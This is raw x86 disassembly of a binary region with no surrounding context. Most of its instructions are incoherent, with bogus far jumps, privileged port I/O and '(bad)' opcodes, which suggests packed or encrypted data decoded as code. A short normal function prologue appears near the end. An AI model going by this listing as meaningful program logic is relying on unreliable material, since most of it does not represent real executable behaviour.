  40924c:	lods   eax,DWORD PTR ds:[esi]
  40924d:	xor    ebp,DWORD PTR [eax-0x45]
  409250:	call   0x96d:0xcbc55784
  409257:	push   0x272bdb28
  40925c:	xor    BYTE PTR [esi+0x331537da],ah
  409262:	inc    esi
  409263:	jge    0x4092c3
  409265:	in     al,0xdb
  409267:	mov    ds:0xf687b3fe,eax
  40926c:	repnz mov esp,0xd7bd1926
  409272:	mov    al,0x81
  409274:	loop   0x409256
  409276:	mov    dl,cl
  409278:	pusha  
  409279:	push   edi
  40927a:	mov    ds:0x3a37781e,al
  40927f:	pop    es
  409280:	popf   
  409281:	test   BYTE PTR [edx-0x47],al
  409284:	rol    DWORD PTR [edi+0x78],1
  409287:	and    BYTE PTR [edx],ch
  409289:	jl     0x409257
  40928b:	inc    esi
  40928c:	mov    al,0x71
  40928e:	jmp    0xae60f216
  409293:	leave  
  409294:	test   DWORD PTR [ecx],ecx
  409296:	pop    ebp
  409297:	inc    eax
  409298:	gs xchg ebx,eax
  40929a:	or     eax,0x869f7d62
  40929f:	dec    ebx
  4092a0:	nop
  4092a1:	cmp    dl,BYTE PTR [ebp-0x45]
  4092a4:	sub    esi,ebp
  4092a6:	inc    esi
  4092a7:	add    DWORD PTR [eax+0x18d82b95],esp
  4092ad:	jns    0x4092e7
  4092af:	push   esi
  4092b0:	jmp    DWORD PTR [eax-0x43]
  4092b3:	aaa    
  4092b4:	xchg   BYTE PTR [edx+0x3c],dl
  4092b7:	or     cl,al
  4092b9:	stc    
  4092ba:	mov    eax,ds:0xce408fb9
  4092bf:	shr    BYTE PTR [eax],cl
  4092c1:	in     al,dx
  4092c2:	jnp    0x4092db
  4092c4:	add    eax,DWORD PTR [ebx]
  4092c6:	push   ebx
  4092c7:	outs   dx,DWORD PTR ds:[esi]
  4092c8:	mov    al,ds:0x9bf448f
  4092cd:	cmp    BYTE PTR [ebx+0x2edda9c8],dh
  4092d3:	xchg   ecx,eax
  4092d4:	and    esp,edi
  4092d6:	push   0x46
  4092d8:	adc    BYTE PTR [edx+0x52],al
  4092db:	fisubr WORD PTR [edi+esi*2]
  4092de:	ins    DWORD PTR es:[edi],dx
  4092df:	ins    BYTE PTR es:[edi],dx
  4092e0:	ss push 0x85215b20
  4092e6:	jmp    0x409315
  4092e8:	aas    
  4092e9:	mov    ch,0xc4
  4092eb:	shl    BYTE PTR [ecx+0x29aa6cac],0x45
  4092f2:	jmp    0x40933c
  4092f4:	nop
  4092f5:	bound  esi,QWORD PTR [ecx]
  4092f7:	loopne 0x4092eb
  4092f9:	adc    DWORD PTR ds:0x933edf39,edi
  4092ff:	pop    esp
  409300:	dec    edx
  409301:	push   DWORD PTR [eax]
  409303:	lea    eax,ds:0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	pop    ss
  40932e:	push   0xfffffff7
  409330:	dec    ebx
  409331:	daa    
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x4093a2
  40933a:	mov    al,ds:0xf7c71271
  40933f:	les    ebx,FWORD PTR [esi+0x34]
  409342:	test   al,0xaf
  409344:	xlat   BYTE PTR ds:[ebx]
  409345:	call   0xd2f6:0xb7e17444
  40934c:	pop    edi
  40934d:	jmp    0xe623:0x6b8c86ca
  409354:	add    eax,0x3f4d15f2
  409359:	sbb    BYTE PTR [ecx+0x1d59a1b3],ch
  40935f:	pop    ecx
  409360:	fs ror dh,0x2f
  409364:	pop    ebp
  409365:	mov    al,ds:0x42a32114
  40936a:	int    0x3e
  40936c:	(bad)  
  40936e:	inc    esp
  40936f:	xchg   ebx,eax
  409370:	cmp    BYTE PTR [ecx-0x4aced5c1],al
  409376:	push   0x41
  409378:	enter  0x572a,0x50
  40937c:	and    DWORD PTR [ebx-0x6b],0x56
  409380:	xor    DWORD PTR fs:[ecx-0xb],esp
  409384:	retf   
  409385:	daa    
  409386:	aad    0xc4
  409388:	lea    esi,[esi]
  40938a:	add    esp,DWORD PTR [ecx-0x358d64aa]
  409390:	add    eax,0x47ff7473
  409395:	inc    esi
  409396:	imul   ecx,DWORD PTR [ebx+0x5b],0x762ffeb6
  40939d:	mov    edi,0xb59e8d87
  4093a2:	clc    
  4093a3:	js     0x409401
  4093a5:	add    eax,0x14f85a6c
  4093aa:	fs loopne 0x409397
  4093ad:	aaa    
  4093ae:	xor    ebp,DWORD PTR [eax+ebx*1+0x51f8848]
  4093b5:	xchg   esi,eax
  4093b6:	into   
  4093b7:	inc    edi
  4093b8:	adc    BYTE PTR [ebp+ebp*4-0x4b2bd776],bl
  4093bf:	out    0x89,eax
  4093c1:	call   0xf08241d
  4093c6:	xchg   edx,eax
  4093c7:	ret    
  4093c8:	cmc    
  4093c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093ca:	lahf   
  4093cb:	cmp    al,0xd4
  4093cd:	jb     0x40939f
  4093cf:	outs   dx,BYTE PTR ds:[esi]
  4093d0:	cs cdq 
  4093d2:	cwde   
  4093d3:	inc    ecx
  4093d4:	mov    ah,al
  4093d6:	cmp    ah,dl
  4093d8:	jo     0x409405
  4093da:	pusha  
  4093db:	adc    edx,DWORD PTR [eax]
  4093dd:	and    ch,ah
  4093df:	push   ds
  4093e0:	leave  
  4093e1:	les    ebx,FWORD PTR [esi]
  4093e3:	repnz pushw 0x27
  4093e7:	lahf   
  4093e8:	mov    ecx,0x4c35f626
  4093ed:	dec    ecx
  4093ee:	inc    edx
  4093ef:	mov    ds:0x89d7b011,eax
  4093f4:	inc    esp
  4093f5:	test   BYTE PTR [esp+eax*4],0x26
  4093f9:	test   BYTE PTR [ecx+0x35],ch
  4093fc:	inc    ebx
  4093fd:	sub    BYTE PTR [edx],dh
  4093ff:	(bad)  
  409400:	jae    0x409401
  409402:	sbb    BYTE PTR [edi+0x7f],0x89
  409406:	shl    DWORD PTR [eax-0x63035381],cl
  40940c:	and    cl,cl
  40940e:	fnstsw WORD PTR [ecx]
  409410:	dec    ebp
  409411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409412:	jno    0x4093bc
  409414:	scas   al,BYTE PTR es:[edi]
  409415:	ror    ebp,0x48
  409418:	cmp    ebx,edi
  40941a:	test   DWORD PTR [ebx],ebx
  40941c:	add    BYTE PTR [ecx-0x31fab31d],bl
  409422:	mov    ecx,0xb4a862d3
  409427:	add    BYTE PTR [edi+ebp*1-0x123b949e],al
  40942e:	outs   dx,BYTE PTR ds:[esi]
  40942f:	sbb    esp,0x3ea25a01
  409435:	jle    0x409450
  409437:	push   esp
  409438:	pop    edi
  409439:	fcmovb st,st(6)
  40943b:	sahf   
  40943c:	sahf   
  40943d:	stos   BYTE PTR es:[edi],al
  40943e:	and    BYTE PTR [ebx-0x7],ah
  409441:	inc    ebp
  409442:	xor    al,0x9d
  409444:	xchg   edx,edx
  409446:	nop
  409447:	or     al,BYTE PTR [esi-0x25]
  40944a:	fld    DWORD PTR [ecx+ebp*4]
  40944d:	cwde   
  40944e:	loopne 0x409446
  409450:	or     al,0xc7
  409452:	(bad)  
  409454:	pop    edi
  409455:	daa    
  409456:	popf   
  409457:	sub    BYTE PTR ds:0x59b4e27c,dh
  40945d:	(bad)  
  40945f:	cld    
  409460:	fwait
  409461:	shl    BYTE PTR [ebp+0x7c3a9744],0xf8
  409468:	out    dx,al
  409469:	sub    BYTE PTR [edi+0x45],bl
  40946c:	mov    bl,0x9a
  40946e:	push   esi
  40946f:	pop    ebp
  409470:	imul   ebp,ebx,0x9ed11ce2
  409476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409477:	call   0xa264f254
  40947c:	push   0x5b
  40947e:	mov    ecx,0xf222fba8
  409483:	loop   0x409453
  409485:	outs   dx,BYTE PTR ds:[esi]
  409486:	xchg   ecx,eax
  409487:	and    DWORD PTR [ebx],esp
  409489:	cmp    DWORD PTR [eax-0x75],edi
  40948c:	mov    cs,WORD PTR ds:0xd8e5a892
  409492:	inc    edx
  409493:	fnsave [eax+0xc72a4f3]
  409499:	shl    ebp,1
  40949b:	pop    ds
  40949c:	neg    esp
  40949e:	in     eax,0xbc
  4094a0:	xor    DWORD PTR [eax+0x56],0xdf51a20c
  4094a7:	xor    BYTE PTR [ecx-0xd408a17],dl
  4094ad:	mov    ds:0xa6eae32e,eax
  4094b2:	outs   dx,BYTE PTR ds:[esi]
  4094b3:	xchg   ecx,eax
  4094b4:	dec    ebx
  4094b5:	cmp    eax,0xf4f61543
  4094ba:	inc    esp
  4094bb:	mov    ch,al
  4094bd:	mov    bl,0xc
  4094bf:	inc    edx
  4094c0:	sbb    al,0x77
  4094c2:	cmp    DWORD PTR [eax+0xc1ade62],eax
  4094c8:	loopne 0x409542
  4094ca:	sbb    DWORD PTR [ebx-0x7c],edi
  4094cd:	or     DWORD PTR [esi+0x6072ad87],esp
  4094d3:	push   eax
  4094d4:	pop    ss
  4094d5:	mov    edx,edi
  4094d7:	int    0xa
  4094d9:	xchg   edi,eax
  4094da:	mov    eax,ds:0xeb23fe6
  4094df:	test   DWORD PTR [eax-0x10],0x33de6b98
  4094e6:	scas   al,BYTE PTR es:[edi]
  4094e7:	mov    WORD PTR [ebx+0xa207086],cs
  4094ed:	adc    bh,al
  4094ef:	(bad)  
  4094f0:	push   0xffffff93
  4094f2:	icebp  
  4094f3:	and    eax,0x9aca064
  4094f8:	xchg   edi,eax
  4094f9:	xor    ah,dh
  4094fb:	push   ss
  4094fc:	jno    0x40955c
  4094fe:	dec    eax
  4094ff:	push   ebx
  409500:	dec    edi
  409501:	lahf   
  409502:	icebp  
  409503:	sbb    bh,BYTE PTR [esi-0x76]
  409506:	inc    eax
  409507:	cld    
  409508:	mov    bh,0x4a
  40950a:	sbb    al,0x4e
  40950c:	shl    DWORD PTR [esi-0x39],1
  40950f:	xlat   BYTE PTR ds:[ebx]
  409510:	inc    eax
  409511:	mov    ds:0x2515c6a3,eax
  409516:	test   BYTE PTR [ebp+ebx*4-0x47871b17],dh
  40951d:	cmc    
  40951e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40951f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409520:	in     eax,0xdd
  409522:	(bad)  [eax+0x75b3e6bd]
  409528:	lea    ecx,[edx+0x37f0a865]
  40952e:	clc    
  40952f:	ja     0x409505
  409531:	dec    ebp
  409532:	test   eax,0x959c9274
  409537:	inc    esi
  409538:	push   0xba664d9d
  40953d:	(bad)  
  40953e:	pop    ecx
  40953f:	ss jg  0x4094ff
  409542:	in     eax,dx
  409543:	push   0xffffffcd
  409545:	ftst   
  409547:	pop    esi
  409548:	push   ss
  409549:	mov    edx,DWORD PTR [esp+edx*2-0x24]
  40954d:	fstp   TBYTE PTR [ecx+0x41]
  409550:	mov    ds,WORD PTR [ecx+0x84595b5]
  409556:	ret    0x8d
  409559:	inc    ebp
  40955a:	(bad)
  40955e:	pushf  
  40955f:	mov    ebp,0xb4ce7fef
  409564:	aam    0x22
  409566:	adc    ecx,DWORD PTR [ebx+eiz*2+0x2e567148]
  40956d:	popf   
  40956e:	mov    eax,ds:0xe07f334d
  409573:	pop    edx
  409574:	mov    ah,0xde
  409576:	sbb    DWORD PTR [edi+eax*4],esi
  409579:	jecxz  0x4095dd
  40957b:	imul   edi
  40957d:	jb     0x40952d
  40957f:	jne    0x409592
  409581:	scas   eax,DWORD PTR es:[edi]
  409582:	sub    BYTE PTR [ebx-0x12297a78],al
  409588:	(bad)  
  409589:	in     al,0x53
  40958b:	dec    edi
  40958c:	mov    eax,ds:0xcf0ce1b1
  409591:	inc    ecx
  409592:	in     al,dx
  409593:	mov    ecx,0x9e7384ce
  409598:	dec    eax
  409599:	dec    edi
  40959a:	fdiv   QWORD PTR [eax-0xb]
  40959d:	push   ss
  40959e:	xchg   ebp,eax
  40959f:	or     al,0x59
  4095a1:	das    
  4095a2:	sar    DWORD PTR [ebx-0x11e3294c],1
  4095a8:	pop    esi
  4095a9:	out    dx,eax
  4095aa:	inc    eax
  4095ab:	loopne 0x4095fb
  4095ad:	test   dh,0x5a
  4095b0:	hlt    
  4095b1:	jge    0x409605
  4095b3:	cmp    BYTE PTR [edi+0x14],ah
  4095b6:	cmp    eax,ebp
  4095b8:	call   0x6545:0xc82fc8e5
  4095bf:	stos   BYTE PTR es:[edi],al
  4095c0:	cmp    al,0xa8
  4095c2:	std    
  4095c3:	mov    edi,0x25a7fdbf
  4095c8:	jp     0x4095c5
  4095ca:	push   ebx
  4095cb:	imul   eax,DWORD PTR [edx+0x12c69686],0x5eb9f595
  4095d5:	arpl   bx,di
  4095d7:	ror    DWORD PTR [eax+ebx*2-0x53bfc4b2],cl
  4095de:	dec    eax
  4095df:	popa   
  4095e0:	dec    eax
  4095e1:	shl    DWORD PTR [ebx-0x73],cl
  4095e4:	(bad)  
  4095e5:	fwait
  4095e6:	cmp    dh,ch
  4095e8:	adc    ecx,0x4d
  4095eb:	jns    0x40964f
  4095ed:	fsub   DWORD PTR [ecx+0x73a9d822]
  4095f3:	arpl   bx,bx
  4095f5:	mov    ?,WORD PTR [edi+0x6cb033f6]
  4095fb:	jbe    0x4095ea
  4095fd:	rcl    esi,0xbc
  409600:	adc    eax,0xc3b8d3c4
  409605:	mov    edi,0x484d4b3c
  40960a:	dec    edi
  40960b:	ret    
  40960c:	jp     0x409672
  40960e:	int    0xcf
  409610:	out    dx,eax
  409611:	adc    eax,0x6200ed83
  409616:	inc    ecx
  409617:	loop   0x40964e
  409619:	and    DWORD PTR [edx+0x66cbb514],edx
  40961f:	cld    
  409620:	int    0xc8
  409622:	cmp    esi,DWORD PTR [eax]
  409624:	cmc    
  409625:	repz lock jmp 0xadd0876b
  40962c:	imul   ebp,ecx,0x3ce209f4
  409632:	and    eax,0xd1bee148
  409637:	ret    
  409638:	add    BYTE PTR [ebp+0x2c],dl
  40963b:	lock repz dec edi
  40963e:	scas   al,BYTE PTR es:[edi]
  40963f:	nop
  409640:	mov    dh,0x7c
  409642:	test   al,0x76
  409644:	leave  
  409645:	rcr    dh,1
  409647:	inc    eax
  409648:	push   cs
  409649:	cmp    cl,dh
  40964b:	or     al,0x69
  40964d:	inc    ebp
  40964e:	push   eax
  40964f:	call   FWORD PTR [esi]
  409651:	sub    bh,BYTE PTR [ecx+0x14]
  409654:	push   ebp
  409655:	ret    0x5e91
  409658:	outs   dx,BYTE PTR ds:[esi]
  409659:	add    BYTE PTR [edx],0xa4
  40965c:	pop    edx
  40965d:	clc    
  40965e:	inc    esi
  409660:	add    al,0x2c
  409662:	add    ch,bh
  409664:	inc    edx
  409665:	jge    0x4096ca
  409667:	or     edi,DWORD PTR [esi-0x74feaf01]
  40966d:	inc    ebp
  40966e:	loopne 0x4095fb
  409670:	or     eax,0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [ebx+ecx*8-0x10280323],eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x4096fb
  409693:	cdq    
  409694:	aad    0x9d
  409696:	icebp  
  409697:	pop    esp
  409698:	adc    ecx,DWORD PTR [esi+eax*4]
  40969b:	leave  
  40969c:	cmp    DWORD PTR [ebp-0x55],0xce601580
  4096a3:	fisttp WORD PTR [edx]
  4096a5:	and    eax,0x509efbb9
  4096aa:	call   0xcd1e5be4
  4096af:	popf   
  4096b0:	mov    cl,0x32
  4096b2:	stos   DWORD PTR es:[edi],eax
  4096b3:	ret    0x79e8
  4096b6:	aaa    
  4096b7:	mov    edx,0x1f9529de
  4096bc:	clc    
  4096bd:	mov    cl,0x63
  4096bf:	loop   0x409708
  4096c1:	sub    al,0xb2
  4096c3:	imul   ebp,DWORD PTR [esi+0x42],0x834f9dae
  4096ca:	aam    0xcd
  4096cc:	ins    BYTE PTR es:[edi],dx
  4096cd:	sbb    BYTE PTR [eax+0x2ce0478e],bl
  4096d3:	js     0x4096a9
  4096d5:	fwait
  4096d6:	popa   
  4096d7:	xchg   esi,eax
  4096d8:	mov    esp,DWORD PTR [ebx]
  4096da:	push   esp
  4096db:	test   eax,0x69573e89
  4096e0:	lods   eax,DWORD PTR ds:[esi]
  4096e1:	cld    
  4096e2:	push   es
  4096e3:	mov    ebp,DWORD PTR ds:0x97a5cd9c
  4096e9:	(bad)  
  4096ea:	test   eax,0x4e734a3a
  4096ef:	(bad)
  4096f3:	pop    ss
  4096f4:	xor    al,0xf0
  4096f6:	aas    
  4096f7:	shl    DWORD PTR [edx+0x65],cl
  4096fa:	dec    eax
  4096fb:	test   BYTE PTR [ecx+esi*1-0x2d],0xce
  409700:	(bad)  
  409701:	mov    ah,0x74
  409703:	gs adc eax,0x2b2d52cf
  409709:	xchg   edi,eax
  40970a:	retf   
  40970b:	fidiv  DWORD PTR [esi+0x5909115f]
  409711:	(bad)  
  409712:	cmp    ebx,DWORD PTR ds:0x968e423d
  409718:	pop    esi
  409719:	inc    edx
  40971a:	push   esp
  40971b:	aaa    
  40971c:	inc    eax
  40971d:	fs mov dl,0xbc
  409720:	and    al,0x23
  409722:	add    al,0x5
  409724:	push   0xdb4164b6
  409729:	mov    ?,WORD PTR [esi-0x6318545d]
  40972f:	push   ds
  409730:	aas    
  409731:	inc    si
  409733:	jno    0x4096f0
  409735:	aad    0x91
  409737:	ja     0x4097b1
  409739:	cmp    BYTE PTR [ecx-0x28],ah
  40973c:	xchg   esp,eax
  40973d:	sar    BYTE PTR [edi+0x692158cd],1
  409743:	add    BYTE PTR [edx],al
  409745:	adc    ebp,DWORD PTR [esi+0x18]
  409748:	mov    ah,0x74
  40974a:	ja     0x4097c1
  40974c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40974d:	mov    WORD PTR [ebx],?
  40974f:	dec    esi
  409750:	ds push edx
  409752:	repz sbb eax,0xbb035430
  409758:	test   al,0x7b
  40975a:	dec    ebp
  40975b:	push   ecx
  40975c:	mov    edx,0xa1019f
  409761:	add    dl,BYTE PTR [esi-0x6b305f76]
  409767:	add    eax,0xad75ead8
  40976c:	cs sbb ah,ah
  40976f:	inc    esi
  409770:	out    dx,eax
  409771:	push   esp
  409772:	xor    edi,edx
  409774:	sub    bh,cl
  409776:	pushf  
  409777:	push   ebx
  409778:	cmp    bh,cl
  40977a:	das    
  40977b:	add    al,0x4e
  40977d:	aaa    
  40977e:	xchg   esi,eax
  40977f:	ret    
  409780:	cmp    DWORD PTR [eax-0x2a],ecx
  409783:	in     al,dx
  409784:	into   
  409785:	pop    edi
  409786:	js     0x40979a
  409788:	mov    esi,0x569c2a17
  40978d:	clc    
  40978e:	pushf  
  40978f:	or     ecx,esp
  409791:	cmp    eax,0x220e7de0
  409796:	or     eax,0x2073154d
  40979b:	sahf   
  40979c:	jp     0x409794
  40979e:	add    BYTE PTR [edi+0x698c9645],ah
  4097a4:	push   0x41432a9e
  4097a9:	push   esp
  4097aa:	inc    esp
  4097ab:	xchg   esi,eax
  4097ac:	call   0xc98d:0xef6b3030
  4097b3:	jle    0x40980d
  4097b5:	pop    es
  4097b6:	ficomp DWORD PTR [ebp+0x11]
  4097b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097ba:	ja     0x409756
  4097bc:	xchg   ecx,eax
  4097bd:	push   ds
  4097be:	ja     0x40982a
  4097c0:	test   DWORD PTR [edx],esp
  4097c2:	cdq    
  4097c3:	add    al,0x8b
  4097c5:	out    0xd4,al
  4097c7:	mov    esp,0x7a0d7a82
  4097cc:	(bad)  
  4097ce:	sahf   
  4097cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097d0:	fwait
  4097d1:	xchg   esp,eax
  4097d2:	jb     0x4097dd
  4097d4:	add    ah,BYTE PTR [edx-0x1c]
  4097d7:	jecxz  0x4097d8
  4097d9:	loop   0x409789
  4097db:	inc    ebp
  4097dc:	jp     0x4097e3
  4097de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097df:	lods   al,BYTE PTR ds:[esi]
  4097e0:	mov    edx,0x88b9959b
  4097e5:	stos   DWORD PTR es:[edi],eax
  4097e6:	arpl   cx,di
  4097e8:	lds    ecx,FWORD PTR [edx+0x13]
  4097eb:	enter  0xcf93,0x94
  4097ef:	jmp    0x65fa:0x76c41326
  4097f6:	inc    edx
  4097f7:	shr    BYTE PTR [eax+0x49],1
  4097fa:	push   ebp
  4097fb:	aad    0x76
  4097fd:	aas    
  4097fe:	xor    DWORD PTR [ebx+0x67faba62],ebx
  409804:	ror    DWORD PTR [ecx],0xf4
  409807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409808:	scas   eax,DWORD PTR es:[edi]
  409809:	call   0xc3f9:0xd49a1edc
  409810:	adc    eax,0xfdeb4686
  409815:	cmp    BYTE PTR [ebx-0xa495e4f],0xdb
  40981c:	fwait
  40981d:	or     eax,eax
  40981f:	mov    al,ds:0x2d570a21
  409824:	xor    esi,DWORD PTR [edx-0x35d3de85]
  40982a:	xchg   DWORD PTR [ebx],edi
  40982c:	shl    dl,cl
  40982e:	mov    bh,0xcf
  409830:	adc    DWORD PTR [ebp-0x46],0xffffff87
  409834:	sub    al,0x15
  409836:	jo     0x409868
  409838:	pop    edx
  409839:	inc    ecx
  40983a:	stc    
  40983b:	inc    eax
  40983c:	js     0x40989c
  40983e:	jmp    0xc6d0:0x9364151d
  409845:	fdiv   st(3),st
  409847:	mov    WORD PTR [ebx+0x2fd49fa7],ss
  40984d:	addr16 pushf 
  40984f:	mov    eax,ds:0xd56624fa
  409854:	dec    edx
  409855:	jno    0x409891
  409857:	inc    ecx
  409858:	loope  0x4098a1
  40985a:	sbb    eax,0x7518b1c
  40985f:	and    DWORD PTR [ebx+0x69],esp
  409862:	jb     0x40987d
  409864:	js     0x4098bd
  409866:	lds    esi,FWORD PTR [edx+eiz*4]
  409869:	cmc    
  40986a:	sar    eax,cl
  40986c:	fwait
  40986d:	adc    eax,0x2cc5964b
  409872:	lock xor BYTE PTR [esi+0x65],cl
  409876:	inc    BYTE PTR [eax+0x4]
  409879:	call   0xa8a9e7b7
  40987e:	ret    0xe01b
  409881:	jg     0x4098a9
  409883:	pop    ss
  409884:	and    ch,BYTE PTR [edi-0x37]
  409887:	mov    edi,0x698741ad
  40988c:	test   BYTE PTR [edx-0x7b],0x18
  409890:	adc    ebp,DWORD PTR [edx-0x4d6a7ff5]
  409896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409897:	aas    
  409898:	mov    ebp,0x5eabef38
  40989d:	sbb    DWORD PTR [ecx],esp
  40989f:	ror    DWORD PTR [eax-0x2e],0xf4
  4098a3:	daa    
  4098a4:	(bad)  
  4098a6:	jle    0x40983e
  4098a8:	cmp    DWORD PTR [eax+0x594900b5],edi
  4098ae:	mov    bl,0xc2
  4098b0:	and    eax,0xdaa49b6c
  4098b5:	jp     0x40992e
  4098b7:	idiv   BYTE PTR [edi]
  4098b9:	inc    edx
  4098ba:	jle    0x409859
  4098bc:	std    
  4098bd:	adc    DWORD PTR [edi-0x8432d5d],esp
  4098c3:	imul   edx,edi,0x31b4aa16
  4098c9:	jmp    0x9549035a
  4098ce:	pop    ebp
  4098cf:	adc    BYTE PTR [eax+0x3],bl
  4098d2:	mov    ebp,0x8ed86601
  4098d7:	or     DWORD PTR [esi],esp
  4098d9:	xchg   BYTE PTR [edx+0x7aedb9d0],bl
  4098df:	ror    BYTE PTR [esi+0x547f6b86],cl
  4098e5:	push   ds
  4098e6:	std    
  4098e7:	pop    ds
  4098e8:	push   ecx
  4098e9:	sbb    edi,DWORD PTR [ebx+0x59]
  4098ec:	xlat   BYTE PTR ds:[ebx]
  4098ed:	popf   
  4098ee:	in     eax,0x91
  4098f0:	popf   
  4098f1:	test   eax,0x1c09203d
  4098f6:	(bad)  [esi]
  4098f8:	(bad)  
  4098f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098fa:	push   es
  4098fb:	dec    ebp
  4098fc:	mov    edi,0x17d190f2
  409901:	shl    DWORD PTR [ebp+0x1f],1
  409904:	xchg   edi,ebx
  409906:	mov    WORD PTR [esi+0x656e632a],es
  40990c:	cmp    eax,0xd212de55
  409911:	sub    cl,dl
  409913:	xor    al,BYTE PTR ds:[edi+0x2cfe149c]
  40991a:	jecxz  0x4098ee
  40991c:	mov    bh,0xac
  40991e:	and    al,BYTE PTR [eax+0x25]
  409921:	stos   BYTE PTR es:[edi],al
  409922:	ja     0x40997b
  409924:	sbb    DWORD PTR [ebx],ebx
  409926:	mov    cl,0x82
  409928:	stos   DWORD PTR es:[edi],eax
  409929:	pushf  
  40992a:	hlt    
  40992b:	add    eax,0x37f8c1e7
  409930:	jne    0x409923
  409932:	int3   
  409933:	cli    
  409934:	push   0xffffffa3
  409936:	and    DWORD PTR [edx-0xc],ecx
  409939:	push   cs
  40993a:	add    al,0xe0
  40993c:	push   esi
  40993d:	pop    es
  40993e:	cld    
  40993f:	pop    ss
  409940:	outs   dx,DWORD PTR ds:[esi]
  409941:	aaa    
  409942:	lods   al,BYTE PTR ds:[esi]
  409943:	(bad)  [ebx+ebp*1]
  409946:	cmp    ebx,DWORD PTR [edi+0x2c45e35b]
  40994c:	aad    0x19
  40994e:	hlt    
  40994f:	mov    dl,0x68
  409951:	sbb    eax,0x680ee257
  409956:	xchg   BYTE PTR [ebp-0x76997697],bl
  40995c:	clc    
  40995d:	aas    
  40995e:	or     esi,eax
  409960:	jno    0x4098fe
  409962:	cmp    DWORD PTR [esi],edx
  409964:	ror    DWORD PTR ds:0x851f0834,1
  40996a:	mov    edi,DWORD PTR [ebx]
  40996c:	test   eax,0x4f99a882
  409971:	xchg   dl,bh
  409973:	fsubrp st(0),st
  409975:	cmc    
  409976:	loopne 0x409906
  409978:	cli    
  409979:	cs imul ecx,esp,0xf630ca83
  409980:	cmp    ch,BYTE PTR [ebp+0x22cf08fc]
  409986:	or     BYTE PTR [edx+0x7d],dh
  409989:	or     esi,ebp
  40998b:	dec    edi
  40998c:	xchg   esi,eax
  40998d:	dec    ecx
  40998e:	js     0x409941
  409990:	add    esi,edi
  409992:	jne    0x409958
  409994:	cld    
  409995:	mov    dh,0xa9
  409997:	and    BYTE PTR [edx+edx*2-0x55abd36e],bl
  40999e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40999f:	jo     0x4099cf
  4099a1:	dec    esp
  4099a2:	(bad)  
  4099a3:	sub    al,0x14
  4099a5:	mov    ds:0x886c0ede,eax
  4099aa:	lods   al,BYTE PTR ds:[esi]
  4099ab:	retf   
  4099ac:	fcmovbe st,st(2)
  4099ae:	std    
  4099af:	repnz leave 
  4099b1:	inc    ebx
  4099b2:	or     al,0x35
  4099b4:	add    edi,DWORD PTR ds:0x8bd0341c
  4099ba:	pop    eax
  4099bb:	imul   esp,DWORD PTR [ebp-0x1b],0xffffff88
  4099bf:	(bad)  
  4099c0:	push   eax
  4099c1:	mov    edi,0x5e5f0801
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fe0a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e19c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e317
  4099eb:	mov    edi,DWORD PTR ds:0x42e327
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e81c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e1a4,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fd79,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e19c
  409a3d:	sbb    DWORD PTR ds:0x42e76b,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	idiv   DWORD PTR ds:0x87a14b3e
  409a5e:	in     al,dx
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x4099ec
  409a66:	ror    DWORD PTR [edi-0x6ebe71ff],0x63
  409a6d:	push   ds
  409a6e:	in     eax,dx
  409a6f:	call   FWORD PTR ss:[edi-0x41]
  409a73:	inc    ebx
  409a74:	mov    dl,0xdf
